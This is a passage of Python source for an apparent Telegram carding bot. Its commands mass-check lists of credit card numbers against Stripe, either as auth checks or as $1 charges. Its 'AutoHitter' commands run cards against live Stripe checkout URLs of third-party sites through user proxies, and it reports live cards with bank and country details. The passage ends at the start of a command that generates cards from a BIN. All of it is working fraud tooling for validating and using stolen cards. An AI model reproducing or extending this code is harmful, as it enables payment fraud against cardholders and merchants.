    db.update_user_stats(user.id, is_live)
    db.update_gateway_stats('str', is_live)
    db.add_check_history(user.id, card_data['number'][:6], card_data['number'][-4:], 'str', status, result_msg, result.get('time', 0))

    tier = db.get_user_tier(user.id, user.username)
    tier_display = tier.capitalize()

    response = f"""<b>STR</b> {emoji}
━━━━━━━━━━━━━━━━━━━━━
<b>Card:</b> <code>{card_display}</code>
<b>Status:</b> {status_tag} {emoji}
<b>Response:</b> {result_msg}

<b>BIN:</b> {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
<b>Bank:</b> {bin_info['bank'][:30]}
<b>Country:</b> {bin_info['emoji']} {bin_info['country']}

<b>Gate:</b> /str
<b>Time:</b> {result.get('time', 0):.2f}s
<b>Checked By:</b> @{user.username or user.first_name} [{tier_display}]
━━━━━━━━━━━━━━━━━━━━━"""

    await msg.edit_text(response)


@dp.message(Command("mstr"))
async def cmd_mstr(message: Message):
    user = message.from_user

    if db.is_banned(user.id):
        await message.reply("❌ Banned")
        return

    db.get_or_create_user(user.id, user.username, user.first_name)
    tier = db.get_user_tier(user.id)
    limits = get_tier_limits(tier)
    max_cards = limits['mchk']

    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await message.reply(f"""<b>MASS CHECK - /str</b>

<b>Usage:</b> <code>/mstr CC|MM|YY|CVV</code>
(one per line or comma separated)

<b>Limit:</b> {max_cards} cards""")
        return

    cards = extract_cards_from_text(args[1])
    if not cards:
        lines = re.split(r'[\n,]+', args[1])
        for line in lines:
            line = line.strip()
            if line:
                card = parse_card(line)
                if card and luhn_check(card['number']):
                    cards.append(card)
                if len(cards) >= max_cards:
                    break
    else:
        cards = cards[:max_cards]

    if not cards:
        await message.reply("❌ No valid cards found")
        return

    total = len(cards)
    stats = {'approved': 0, '3ds': 0, 'dead': 0}
    live_cards = []

    msg = await message.reply(f"""<b>Processing...</b> 0/{total}

APPROVED: 0 | 3DS: 0 | DEAD: 0

<b>Gate:</b> /str""")

    for i, card in enumerate(cards):
        card_display = format_card_display(card['number'], card['month'], card['year'], card['cvv'])

        try:
            result = await stripe_gate_with_retry(check_card_stripe_auth, card, None, i == 0)
            status = result.get('status', 'UNKNOWN')
            result_msg = result.get('message', '')

            if status == 'APPROVED':
                stats['approved'] += 1
                live_cards.append((card_display, 'APPROVED', result_msg))
                db.update_user_stats(user.id, True)
                db.update_gateway_stats('str', True)

                bin_info = await lookup_bin(card['number'])
                tier_now = db.get_user_tier(user.id, user.username)
                await message.reply(f"""✅ <b>APPROVED!</b> /str

<code>{card_display}</code>
{result_msg}

{bin_info['brand']} | {bin_info['bank'][:20]}
{bin_info['emoji']} {bin_info['country']}

<b>By:</b> @{user.username or user.first_name} [{tier_now.upper()}]""")

            elif status == '3DS':
                stats['3ds'] += 1
                live_cards.append((card_display, '3DS', result_msg))
                db.update_user_stats(user.id, True)
                db.update_gateway_stats('str', True)
            else:
                stats['dead'] += 1
                db.update_user_stats(user.id, False)
                db.update_gateway_stats('str', False)

            db.add_check_history(user.id, card['number'][:6], card['number'][-4:], 'str', status, result_msg, result.get('time', 0))

        except Exception as e:
            stats['dead'] += 1

        if (i + 1) % 2 == 0 or i == total - 1:
            try:
                await msg.edit_text(f"""<b>Processing...</b> {i + 1}/{total}

APPROVED: {stats['approved']} | 3DS: {stats['3ds']} | DEAD: {stats['dead']}

<b>Gate:</b> /str""")
            except Exception:
                pass

        await asyncio.sleep(0.5)

    tier_final = db.get_user_tier(user.id, user.username)
    await msg.edit_text(f"""<b>Completed</b> {total}/{total}

APPROVED: {stats['approved']} | 3DS: {stats['3ds']} | DEAD: {stats['dead']}

<b>Gate:</b> /str
<b>Checked By:</b> @{user.username or user.first_name} [{tier_final.upper()}]""")


@dp.message(Command("mstrtxt"))
async def cmd_mstrtxt(message: Message):
    user = message.from_user

    if db.is_banned(user.id):
        await message.reply("❌ Banned")
        return

    db.get_or_create_user(user.id, user.username, user.first_name)
    tier = db.get_user_tier(user.id)
    limits = get_tier_limits(tier)
    max_cards = limits['mtxt']

    if not message.reply_to_message or not message.reply_to_message.document:
        await message.reply(f"""<b>MASS TXT - /str</b>

<b>Usage:</b> Reply to a .txt file with <code>/mstrtxt</code>

<b>Limit:</b> {max_cards} cards""")
        return

    doc = message.reply_to_message.document
    if not doc.file_name.endswith('.txt'):
        await message.reply("❌ Please send a .txt file")
        return

    try:
        file = await bot.get_file(doc.file_id)
        file_content = await bot.download_file(file.file_path)
        content = file_content.read().decode('utf-8', errors='ignore')
    except Exception as e:
        await message.reply(f"❌ Failed to read file: {str(e)[:50]}")
        return

    cards = extract_cards_from_text(content)
    if not cards:
        lines = content.strip().split('\n')
        for line in lines:
            line = line.strip()
            if line:
                card = parse_card(line)
                if card and luhn_check(card['number']):
                    cards.append(card)
                if len(cards) >= max_cards:
                    break
    else:
        cards = cards[:max_cards]

    if not cards:
        await message.reply("❌ No valid cards in file")
        return

    total = len(cards)
    stats = {'approved': 0, '3ds': 0, 'dead': 0}
    live_cards = []

    task_id, cancel_event = await task_manager.register(user.id, 'str', total)

    msg = await message.reply(f"""<b>Processing...</b> 0/{total}

APPROVED: 0 | 3DS: 0 | DEAD: 0

<b>Gate:</b> /str
<b>Task ID:</b> <code>{task_id}</code>
<b>Stop:</b> <code>/stop {task_id}</code>""")

    try:
        for i, card in enumerate(cards):
            if cancel_event.is_set():
                break

            card_display = format_card_display(card['number'], card['month'], card['year'], card['cvv'])

            try:
                result = await stripe_gate_with_retry(check_card_stripe_auth, card, None, i == 0)
                status = result.get('status', 'UNKNOWN')
                result_msg = result.get('message', '')

                if status == 'APPROVED':
                    stats['approved'] += 1
                    live_cards.append((card_display, 'APPROVED', result_msg))
                    db.update_user_stats(user.id, True)
                    db.update_gateway_stats('str', True)

                    bin_info = await lookup_bin(card['number'])
                    tier_now = db.get_user_tier(user.id, user.username)
                    await message.reply(f"""✅ <b>APPROVED!</b> /str

<code>{card_display}</code>
{result_msg}

{bin_info['brand']} | {bin_info['bank'][:20]}
{bin_info['emoji']} {bin_info['country']}

<b>By:</b> @{user.username or user.first_name} [{tier_now.upper()}]""")

                elif status == '3DS':
                    stats['3ds'] += 1
                    live_cards.append((card_display, '3DS', result_msg))
                    db.update_user_stats(user.id, True)
                    db.update_gateway_stats('str', True)
                else:
                    stats['dead'] += 1
                    db.update_user_stats(user.id, False)
                    db.update_gateway_stats('str', False)

                db.add_check_history(user.id, card['number'][:6], card['number'][-4:], 'str', status, result_msg, result.get('time', 0))

            except Exception as e:
                stats['dead'] += 1

            await task_manager.update_progress(task_id, i + 1)

            if (i + 1) % 2 == 0 or i == total - 1:
                try:
                    await msg.edit_text(f"""<b>Processing...</b> {i + 1}/{total}

APPROVED: {stats['approved']} | 3DS: {stats['3ds']} | DEAD: {stats['dead']}

<b>Gate:</b> /str
<b>Task ID:</b> <code>{task_id}</code>
<b>Stop:</b> <code>/stop {task_id}</code>""")
                except Exception:
                    pass

            await asyncio.sleep(0.5)

        tier_final = db.get_user_tier(user.id, user.username)
        await msg.edit_text(f"""<b>Completed</b> {total}/{total}

APPROVED: {stats['approved']} | 3DS: {stats['3ds']} | DEAD: {stats['dead']}

<b>Gate:</b> /str
<b>Checked By:</b> @{user.username or user.first_name} [{tier_final.upper()}]""")

    finally:
        await task_manager.unregister(task_id)


@dp.message(Command("str5"))
async def cmd_str5(message: Message):
    user = message.from_user

    if db.is_banned(user.id):
        await message.reply("❌ You are banned")
        return

    db.get_or_create_user(user.id, user.username, user.first_name)

    args = message.text.split(maxsplit=1)
    card_data = None

    if len(args) >= 2:
        card_data = parse_card(args[1])

    if not card_data and message.reply_to_message:
        reply_text = message.reply_to_message.text or message.reply_to_message.caption or ""
        extracted = extract_cards_from_text(reply_text)
        if extracted:
            card_data = extracted[0]
        elif reply_text:
            card_data = parse_card(reply_text.strip())

    if not card_data:
        await message.reply("""<b>💳 STR5 - Stripe $1</b>

<b>Usage:</b> <code>/str5 CC|MM|YY|CVV</code>

<b>Response Format:</b>
🔥 CHARGED = $1 successfully charged
❌ Decline message in response

<b>Mass Check:</b>
<code>/mstr5</code> - paste cards
<code>/mstr5txt</code> - reply to .txt file""")
        return

    if not luhn_check(card_data['number']):
        await message.reply("❌ Invalid card number (Luhn check failed)")
        return

    user_proxy = await proxy_manager.get_proxy_url(user.id)
    proxy_status = "🔒 Proxy" if user_proxy else "🌐 No Proxy"

    record_check(user.id)

    card_display = format_card_display(card_data['number'], card_data['month'], card_data['year'], card_data['cvv'])

    msg = await message.reply(f"""⏳ <b>Checking...</b>

<b>Card:</b> <code>{card_display}</code>
<b>Gate:</b> STR5
<b>Connection:</b> {proxy_status}""")

    bin_info = await lookup_bin(card_data['number'])

    result = await stripe_gate_with_retry(check_card_stripe_dollar, card_data, user_proxy, True)

    status = result.get('status', 'UNKNOWN')
    result_msg = result.get('message', '')

    if status == 'CHARGED':
        emoji = '🔥'
        status_tag = 'CHARGED'
        is_live = True
    elif status == 'DECLINED':
        emoji = '❌'
        status_tag = 'DECLINED'
        is_live = False
    else:
        emoji = '⚠️'
        status_tag = status
        is_live = False

    db.update_user_stats(user.id, is_live)
    db.update_gateway_stats('str5', is_live)
    db.add_check_history(user.id, card_data['number'][:6], card_data['number'][-4:], 'str5', status, result_msg, result.get('time', 0))

    tier = db.get_user_tier(user.id, user.username)
    tier_display = tier.capitalize()

    response = f"""<b>STR5</b> {emoji}
━━━━━━━━━━━━━━━━━━━━━
<b>Card:</b> <code>{card_display}</code>
<b>Status:</b> {status_tag} {emoji}
<b>Response:</b> {result_msg}

<b>BIN:</b> {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
<b>Bank:</b> {bin_info['bank'][:30]}
<b>Country:</b> {bin_info['emoji']} {bin_info['country']}

<b>Gate:</b> /str5
<b>Time:</b> {result.get('time', 0):.2f}s
<b>Checked By:</b> @{user.username or user.first_name} [{tier_display}]
━━━━━━━━━━━━━━━━━━━━━"""

    await msg.edit_text(response)


@dp.message(Command("mstr5"))
async def cmd_mstr5(message: Message):
    user = message.from_user

    if db.is_banned(user.id):
        await message.reply("❌ Banned")
        return

    db.get_or_create_user(user.id, user.username, user.first_name)
    tier = db.get_user_tier(user.id)
    limits = get_tier_limits(tier)
    max_cards = limits['mchk']

    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await message.reply(f"""<b>MASS CHECK - /str5</b>

<b>Usage:</b> <code>/mstr5 CC|MM|YY|CVV</code>
(one per line or comma separated)

<b>Limit:</b> {max_cards} cards""")
        return

    cards = extract_cards_from_text(args[1])
    if not cards:
        lines = re.split(r'[\n,]+', args[1])
        for line in lines:
            line = line.strip()
            if line:
                card = parse_card(line)
                if card and luhn_check(card['number']):
                    cards.append(card)
                if len(cards) >= max_cards:
                    break
    else:
        cards = cards[:max_cards]

    if not cards:
        await message.reply("❌ No valid cards found")
        return

    total = len(cards)
    stats = {'charged': 0, 'dead': 0}
    live_cards = []

    msg = await message.reply(f"""<b>Processing...</b> 0/{total}

CHARGED: 0 | DEAD: 0

<b>Gate:</b> /str5""")

    for i, card in enumerate(cards):
        card_display = format_card_display(card['number'], card['month'], card['year'], card['cvv'])

        try:
            result = await stripe_gate_with_retry(check_card_stripe_dollar, card, None, i == 0)
            status = result.get('status', 'UNKNOWN')
            result_msg = result.get('message', '')

            if status == 'CHARGED':
                stats['charged'] += 1
                live_cards.append((card_display, 'CHARGED', result_msg))
                db.update_user_stats(user.id, True)
                db.update_gateway_stats('str5', True)

                bin_info = await lookup_bin(card['number'])
                tier_now = db.get_user_tier(user.id, user.username)
                await message.reply(f"""🔥 <b>CHARGED!</b> /str5

<code>{card_display}</code>
{result_msg}

{bin_info['brand']} | {bin_info['bank'][:20]}
{bin_info['emoji']} {bin_info['country']}

<b>By:</b> @{user.username or user.first_name} [{tier_now.upper()}]""")
            else:
                stats['dead'] += 1
                db.update_user_stats(user.id, False)
                db.update_gateway_stats('str5', False)

            db.add_check_history(user.id, card['number'][:6], card['number'][-4:], 'str5', status, result_msg, result.get('time', 0))

        except Exception:
            stats['dead'] += 1

        if (i + 1) % 2 == 0 or i == total - 1:
            try:
                await msg.edit_text(f"""<b>Processing...</b> {i + 1}/{total}

CHARGED: {stats['charged']} | DEAD: {stats['dead']}

<b>Gate:</b> /str5""")
            except Exception:
                pass

        await asyncio.sleep(0.5)

    tier_final = db.get_user_tier(user.id, user.username)
    await msg.edit_text(f"""<b>Completed</b> {total}/{total}

CHARGED: {stats['charged']} | DEAD: {stats['dead']}

<b>Gate:</b> /str5
<b>Checked By:</b> @{user.username or user.first_name} [{tier_final.upper()}]""")


@dp.message(Command("mstr5txt"))
async def cmd_mstr5txt(message: Message):
    user = message.from_user

    if db.is_banned(user.id):
        await message.reply("❌ Banned")
        return

    db.get_or_create_user(user.id, user.username, user.first_name)
    tier = db.get_user_tier(user.id)
    limits = get_tier_limits(tier)
    max_cards = limits['mtxt']

    if not message.reply_to_message or not message.reply_to_message.document:
        await message.reply(f"""<b>MASS TXT - /str5</b>

<b>Usage:</b> Reply to a .txt file with <code>/mstr5txt</code>

<b>Limit:</b> {max_cards} cards""")
        return

    doc = message.reply_to_message.document
    if not doc.file_name.endswith('.txt'):
        await message.reply("❌ Please send a .txt file")
        return

    try:
        file = await bot.get_file(doc.file_id)
        file_content = await bot.download_file(file.file_path)
        content = file_content.read().decode('utf-8', errors='ignore')
    except Exception as e:
        await message.reply(f"❌ Failed to read file: {str(e)[:50]}")
        return

    cards = extract_cards_from_text(content)
    if not cards:
        lines = content.strip().split('\n')
        for line in lines:
            line = line.strip()
            if line:
                card = parse_card(line)
                if card and luhn_check(card['number']):
                    cards.append(card)
                if len(cards) >= max_cards:
                    break
    else:
        cards = cards[:max_cards]

    if not cards:
        await message.reply("❌ No valid cards in file")
        return

    total = len(cards)
    stats = {'charged': 0, 'dead': 0}
    live_cards = []

    task_id, cancel_event = await task_manager.register(user.id, 'str5', total)

    msg = await message.reply(f"""<b>Processing...</b> 0/{total}

CHARGED: 0 | DEAD: 0

<b>Gate:</b> /str5
<b>Task ID:</b> <code>{task_id}</code>
<b>Stop:</b> <code>/stop {task_id}</code>""")

    try:
        for i, card in enumerate(cards):
            if cancel_event.is_set():
                break

            card_display = format_card_display(card['number'], card['month'], card['year'], card['cvv'])

            try:
                result = await stripe_gate_with_retry(check_card_stripe_dollar, card, None, i == 0)
                status = result.get('status', 'UNKNOWN')
                result_msg = result.get('message', '')

                if status == 'CHARGED':
                    stats['charged'] += 1
                    live_cards.append((card_display, 'CHARGED', result_msg))
                    db.update_user_stats(user.id, True)
                    db.update_gateway_stats('str5', True)

                    bin_info = await lookup_bin(card['number'])
                    tier_now = db.get_user_tier(user.id, user.username)
                    await message.reply(f"""🔥 <b>CHARGED!</b> /str5

<code>{card_display}</code>
{result_msg}

{bin_info['brand']} | {bin_info['bank'][:20]}
{bin_info['emoji']} {bin_info['country']}

<b>By:</b> @{user.username or user.first_name} [{tier_now.upper()}]""")
                else:
                    stats['dead'] += 1
                    db.update_user_stats(user.id, False)
                    db.update_gateway_stats('str5', False)

                db.add_check_history(user.id, card['number'][:6], card['number'][-4:], 'str5', status, result_msg, result.get('time', 0))

            except Exception:
                stats['dead'] += 1

            await task_manager.update_progress(task_id, i + 1)

            if (i + 1) % 2 == 0 or i == total - 1:
                try:
                    await msg.edit_text(f"""<b>Processing...</b> {i + 1}/{total}

CHARGED: {stats['charged']} | DEAD: {stats['dead']}

<b>Gate:</b> /str5
<b>Task ID:</b> <code>{task_id}</code>
<b>Stop:</b> <code>/stop {task_id}</code>""")
                except Exception:
                    pass

            await asyncio.sleep(0.5)

        tier_final = db.get_user_tier(user.id, user.username)
        await msg.edit_text(f"""<b>Completed</b> {total}/{total}

CHARGED: {stats['charged']} | DEAD: {stats['dead']}

<b>Gate:</b> /str5
<b>Checked By:</b> @{user.username or user.first_name} [{tier_final.upper()}]""")

    finally:
        await task_manager.unregister(task_id)


@dp.message(Command("autohit"))
async def cmd_autohit(message: Message):
    user = message.from_user

    if db.is_banned(user.id):
        await message.reply("❌ You are banned")
        return

    db.get_or_create_user(user.id, user.username, user.first_name)

    text = message.text or ""
    lines = [l.strip() for l in text.split('\n') if l.strip()]
    args_line = lines[0].split(maxsplit=1)[1] if len(lines[0].split(maxsplit=1)) > 1 else ""
    remaining_lines = lines[1:]

    checkout_url = None
    card_raw = None

    if args_line:
        parts = args_line.split()
        if parts[0].startswith("http"):
            checkout_url = parts[0]
            card_raw = ' '.join(parts[1:]) if len(parts) > 1 else None
        else:
            card_raw = args_line

    if remaining_lines:
        if not checkout_url and remaining_lines[0].startswith("http"):
            checkout_url = remaining_lines[0]
            remaining_lines = remaining_lines[1:]
        if not card_raw and remaining_lines:
            card_raw = remaining_lines[0]

    if not checkout_url and message.reply_to_message:
        reply_text = message.reply_to_message.text or ""
        url_m = re.search(r'https://checkout\.stripe\.com/[^\s]+', reply_text)
        if url_m:
            checkout_url = url_m.group(0)

    card_data = parse_card(card_raw) if card_raw else None
    if not card_data and message.reply_to_message:
        reply_text = message.reply_to_message.text or message.reply_to_message.caption or ""
        extracted = extract_cards_from_text(reply_text)
        if extracted:
            card_data = extracted[0]

    if not checkout_url or not card_data:
        await message.reply("""<b>🌐 AutoHitter</b>

<b>Usage:</b>
<code>/autohit https://checkout.stripe.com/c/pay/cs_live_xxx#yyy CC|MM|YY|CVV</code>

or multiline:
<code>/autohit https://checkout.stripe.com/...</code>
<code>4111111111111111|01|26|123</code>

<b>Mass Check:</b>
<code>/mautohit https://checkout.stripe.com/...</code>
(then cards on next lines)

<code>/mautohittxt https://checkout.stripe.com/...</code>
(reply to .txt file)""")
        return

    if not luhn_check(card_data['number']):
        await message.reply("❌ Invalid card number (Luhn check failed)")
        return

    user_proxy = await proxy_manager.get_proxy_url(user.id)
    proxy_status = "🔒 Proxy" if user_proxy else "🌐 No Proxy"
    record_check(user.id)

    card_display = format_card_display(card_data['number'], card_data['month'], card_data['year'], card_data['cvv'])
    msg = await message.reply(f"""⏳ <b>AutoHitter</b>

<b>Card:</b> <code>{card_display}</code>
<b>Initializing checkout...</b>
<b>Connection:</b> {proxy_status}""")

    pk_live, cs_live, init_data = await autohit_init(checkout_url, user_proxy)
    if not init_data:
        await msg.edit_text("❌ Failed to initialize checkout URL. Check that the URL is valid and not expired.")
        return

    from urllib.parse import urlparse as _urlparse
    site_domain = _urlparse(init_data.get('success_url', '')).netloc or 'Unknown'
    amount = 0
    currency = init_data.get('currency', 'usd').upper()
    if init_data.get('invoice'):
        amount = init_data['invoice'].get('amount_due', 0)
    elif init_data.get('line_item_group'):
        amount = init_data['line_item_group'].get('total', 0)
    elif init_data.get('payment_intent'):
        amount = init_data['payment_intent'].get('amount', 0)
    amount_display = f"${amount / 100:.2f} {currency}" if amount else "Unknown"

    await msg.edit_text(f"""⏳ <b>AutoHitter</b>

<b>Card:</b> <code>{card_display}</code>
<b>Site:</b> {site_domain}
<b>Amount:</b> {amount_display}
<b>Checking...</b>""")

    result = await autohit_check_card(card_data, pk_live, cs_live, init_data, user_proxy)

    status = result.get('status', 'UNKNOWN')
    result_msg = result.get('message', '')

    if status == 'APPROVED':
        emoji = '✅'
        is_live = True
    elif status == '3DS':
        emoji = '✅'
        status = 'Approved ↾ 3DS'
        is_live = True
    elif status == 'DECLINED':
        emoji = '❌'
        is_live = False
    else:
        emoji = '⚠️'
        is_live = False

    db.update_user_stats(user.id, is_live)
    bin_info = await lookup_bin(card_data['number'])
    tier = db.get_user_tier(user.id, user.username)

    await msg.edit_text(f"""<b>AutoHitter</b> {emoji}
━━━━━━━━━━━━━━━━━━━━━
<b>Card:</b> <code>{card_display}</code>
<b>Status:</b> {status} {emoji}
<b>Response:</b> {result_msg}

<b>Site:</b> {site_domain}
<b>Amount:</b> {amount_display}

<b>BIN:</b> {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
<b>Bank:</b> {bin_info['bank'][:30]}
<b>Country:</b> {bin_info['emoji']} {bin_info['country']}

<b>Time:</b> {result.get('time', 0):.2f}s
<b>Checked By:</b> @{user.username or user.first_name} [{tier.capitalize()}]
━━━━━━━━━━━━━━━━━━━━━""")


@dp.message(Command("mautohit"))
async def cmd_mautohit(message: Message):
    user = message.from_user

    if db.is_banned(user.id):
        await message.reply("❌ Banned")
        return

    db.get_or_create_user(user.id, user.username, user.first_name)
    tier = db.get_user_tier(user.id)
    limits = get_tier_limits(tier)
    max_cards = limits['mchk']

    text = message.text or ""
    lines = [l.strip() for l in text.split('\n') if l.strip()]
    first_line_parts = lines[0].split(maxsplit=1)
    after_cmd = first_line_parts[1] if len(first_line_parts) > 1 else ""
    remaining_lines = lines[1:]

    checkout_url = None
    card_lines = []

    if after_cmd.startswith("http"):
        checkout_url = after_cmd.split()[0]
        extra = after_cmd[len(checkout_url):].strip()
        if extra:
            card_lines.append(extra)
    elif after_cmd:
        card_lines.append(after_cmd)

    card_lines.extend(remaining_lines)

    if not checkout_url:
        url_m = re.search(r'https://checkout\.stripe\.com/[^\s]+', '\n'.join(card_lines))
        if url_m:
            checkout_url = url_m.group(0)
            card_lines = [l for l in card_lines if checkout_url not in l]

    if not checkout_url:
        await message.reply("""<b>MASS AutoHitter</b>

<b>Usage:</b>
<code>/mautohit https://checkout.stripe.com/c/pay/cs_live_xxx#yyy</code>
<code>4111111111111111|01|26|123</code>
<code>5500000000000004|02|27|456</code>""")
        return

    cards_text = '\n'.join(card_lines)
    cards = extract_cards_from_text(cards_text)
    if not cards:
        for line in card_lines:
            card = parse_card(line)
            if card and luhn_check(card['number']):
                cards.append(card)
            if len(cards) >= max_cards:
                break
    else:
        cards = cards[:max_cards]

    if not cards:
        await message.reply("❌ No valid cards found. Include cards after the URL.")
        return

    msg = await message.reply(f"""⏳ <b>AutoHitter</b>

Initializing checkout URL...
<b>Cards:</b> {len(cards)}""")

    user_proxy = await proxy_manager.get_proxy_url(user.id)
    pk_live, cs_live, init_data = await autohit_init(checkout_url, user_proxy)
    if not init_data:
        await msg.edit_text("❌ Failed to initialize checkout URL.")
        return

    from urllib.parse import urlparse as _urlparse
    site_domain = _urlparse(init_data.get('success_url', '')).netloc or 'Unknown'
    amount = 0
    currency = init_data.get('currency', 'usd').upper()
    if init_data.get('invoice'):
        amount = init_data['invoice'].get('amount_due', 0)
    elif init_data.get('line_item_group'):
        amount = init_data['line_item_group'].get('total', 0)
    elif init_data.get('payment_intent'):
        amount = init_data['payment_intent'].get('amount', 0)
    amount_display = f"${amount / 100:.2f} {currency}" if amount else "Unknown"

    total = len(cards)
    stats = {'approved': 0, '3ds': 0, 'dead': 0}

    await msg.edit_text(f"""<b>Processing...</b> 0/{total}

APPROVED: 0 | 3DS: 0 | DEAD: 0

<b>Site:</b> {site_domain} | {amount_display}
<b>Gate:</b> AutoHitter""")

    for i, card in enumerate(cards):
        card_display = format_card_display(card['number'], card['month'], card['year'], card['cvv'])
        try:
            result = await autohit_check_card(card, pk_live, cs_live, init_data, user_proxy)
            status = result.get('status', 'UNKNOWN')
            result_msg = result.get('message', '')

            if status == 'APPROVED':
                stats['approved'] += 1
                db.update_user_stats(user.id, True)
                bin_info = await lookup_bin(card['number'])
                tier_now = db.get_user_tier(user.id, user.username)
                await message.reply(f"""✅ <b>APPROVED!</b> AutoHitter

<code>{card_display}</code>
{result_msg}

{bin_info['brand']} | {bin_info['bank'][:20]}
{bin_info['emoji']} {bin_info['country']}

<b>Site:</b> {site_domain} | {amount_display}
<b>By:</b> @{user.username or user.first_name} [{tier_now.upper()}]""")
            elif status == '3DS':
                stats['3ds'] += 1
                db.update_user_stats(user.id, True)
            else:
                stats['dead'] += 1
                db.update_user_stats(user.id, False)
        except Exception:
            stats['dead'] += 1

        if (i + 1) % 2 == 0 or i == total - 1:
            try:
                await msg.edit_text(f"""<b>Processing...</b> {i + 1}/{total}

APPROVED: {stats['approved']} | 3DS: {stats['3ds']} | DEAD: {stats['dead']}

<b>Site:</b> {site_domain} | {amount_display}
<b>Gate:</b> AutoHitter""")
            except Exception:
                pass

        await asyncio.sleep(0.5)

    tier_final = db.get_user_tier(user.id, user.username)
    await msg.edit_text(f"""<b>Completed</b> {total}/{total}

APPROVED: {stats['approved']} | 3DS: {stats['3ds']} | DEAD: {stats['dead']}

<b>Site:</b> {site_domain} | {amount_display}
<b>Gate:</b> AutoHitter
<b>Checked By:</b> @{user.username or user.first_name} [{tier_final.upper()}]""")


@dp.message(Command("mautohittxt"))
async def cmd_mautohittxt(message: Message):
    user = message.from_user

    if db.is_banned(user.id):
        await message.reply("❌ Banned")
        return

    db.get_or_create_user(user.id, user.username, user.first_name)
    tier = db.get_user_tier(user.id)
    limits = get_tier_limits(tier)
    max_cards = limits['mtxt']

    text = message.text or ""
    parts = text.split(maxsplit=1)
    after_cmd = parts[1].strip() if len(parts) > 1 else ""

    checkout_url = None
    if after_cmd.startswith("http"):
        checkout_url = after_cmd.split()[0]

    if not checkout_url:
        await message.reply("""<b>MASS TXT - AutoHitter</b>

<b>Usage:</b> Reply to a .txt file with:
<code>/mautohittxt https://checkout.stripe.com/c/pay/cs_live_xxx#yyy</code>""")
        return

    if not message.reply_to_message or not message.reply_to_message.document:
        await message.reply("<b>Usage:</b> Reply to a .txt file with this command.")
        return

    doc = message.reply_to_message.document
    if not doc.file_name.endswith('.txt'):
        await message.reply("❌ Please send a .txt file")
        return

    try:
        file = await bot.get_file(doc.file_id)
        file_content = await bot.download_file(file.file_path)
        content = file_content.read().decode('utf-8', errors='ignore')
    except Exception as e:
        await message.reply(f"❌ Failed to read file: {str(e)[:50]}")
        return

    cards = extract_cards_from_text(content)
    if not cards:
        for line in content.strip().split('\n'):
            line = line.strip()
            if line:
                card = parse_card(line)
                if card and luhn_check(card['number']):
                    cards.append(card)
                if len(cards) >= max_cards:
                    break
    else:
        cards = cards[:max_cards]

    if not cards:
        await message.reply("❌ No valid cards in file")
        return

    msg = await message.reply(f"""⏳ <b>AutoHitter</b>

Initializing checkout URL...
<b>Cards:</b> {len(cards)}""")

    user_proxy = await proxy_manager.get_proxy_url(user.id)
    pk_live, cs_live, init_data = await autohit_init(checkout_url, user_proxy)
    if not init_data:
        await msg.edit_text("❌ Failed to initialize checkout URL.")
        return

    from urllib.parse import urlparse as _urlparse
    site_domain = _urlparse(init_data.get('success_url', '')).netloc or 'Unknown'
    amount = 0
    currency = init_data.get('currency', 'usd').upper()
    if init_data.get('invoice'):
        amount = init_data['invoice'].get('amount_due', 0)
    elif init_data.get('line_item_group'):
        amount = init_data['line_item_group'].get('total', 0)
    elif init_data.get('payment_intent'):
        amount = init_data['payment_intent'].get('amount', 0)
    amount_display = f"${amount / 100:.2f} {currency}" if amount else "Unknown"

    total = len(cards)
    stats = {'approved': 0, '3ds': 0, 'dead': 0}

    task_id, cancel_event = await task_manager.register(user.id, 'autohit', total)

    await msg.edit_text(f"""<b>Processing...</b> 0/{total}

APPROVED: 0 | 3DS: 0 | DEAD: 0

<b>Site:</b> {site_domain} | {amount_display}
<b>Gate:</b> AutoHitter
<b>Task ID:</b> <code>{task_id}</code>
<b>Stop:</b> <code>/stop {task_id}</code>""")

    try:
        for i, card in enumerate(cards):
            if cancel_event.is_set():
                break

            card_display = format_card_display(card['number'], card['month'], card['year'], card['cvv'])
            try:
                result = await autohit_check_card(card, pk_live, cs_live, init_data, user_proxy)
                status = result.get('status', 'UNKNOWN')
                result_msg = result.get('message', '')

                if status == 'APPROVED':
                    stats['approved'] += 1
                    db.update_user_stats(user.id, True)
                    bin_info = await lookup_bin(card['number'])
                    tier_now = db.get_user_tier(user.id, user.username)
                    await message.reply(f"""✅ <b>APPROVED!</b> AutoHitter

<code>{card_display}</code>
{result_msg}

{bin_info['brand']} | {bin_info['bank'][:20]}
{bin_info['emoji']} {bin_info['country']}

<b>Site:</b> {site_domain} | {amount_display}
<b>By:</b> @{user.username or user.first_name} [{tier_now.upper()}]""")
                elif status == '3DS':
                    stats['3ds'] += 1
                    db.update_user_stats(user.id, True)
                else:
                    stats['dead'] += 1
                    db.update_user_stats(user.id, False)
            except Exception:
                stats['dead'] += 1

            await task_manager.update_progress(task_id, i + 1)

            if (i + 1) % 2 == 0 or i == total - 1:
                try:
                    await msg.edit_text(f"""<b>Processing...</b> {i + 1}/{total}

APPROVED: {stats['approved']} | 3DS: {stats['3ds']} | DEAD: {stats['dead']}

<b>Site:</b> {site_domain} | {amount_display}
<b>Gate:</b> AutoHitter
<b>Task ID:</b> <code>{task_id}</code>
<b>Stop:</b> <code>/stop {task_id}</code>""")
                except Exception:
                    pass

            await asyncio.sleep(0.5)

        tier_final = db.get_user_tier(user.id, user.username)
        await msg.edit_text(f"""<b>Completed</b> {total}/{total}

APPROVED: {stats['approved']} | 3DS: {stats['3ds']} | DEAD: {stats['dead']}

<b>Site:</b> {site_domain} | {amount_display}
<b>Gate:</b> AutoHitter
<b>Checked By:</b> @{user.username or user.first_name} [{tier_final.upper()}]""")

    finally:
        await task_manager.unregister(task_id)


async def cmd_bin(message: Message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await message.reply(f"{MINI_BANNER}\n\n<b>Usage:</b> <code>/bin 123456</code>")
        return

    bin_num = re.sub(r'\D', '', args[1])[:6]
    if len(bin_num) < 6:
        await message.reply("❌ Enter at least 6 digits")
        return

    msg = await message.reply("looking up...")

    bin_info = await lookup_bin(bin_num)

    response = f"""<b>BIN {bin_info['bin']}</b>

{bin_info['brand']} | {bin_info['type']}
{bin_info['level']}
{bin_info['bank']}
{bin_info['emoji']} {bin_info['country']}"""

    await msg.edit_text(response)

@dp.message(Command("gen"))
async def cmd_gen(message: Message):
    """Generate CC from BIN"""
    user = message.from_user
    db.get_or_create_user(user.id, user.username, user.first_name)

    args = message.text.split(maxsplit=1)
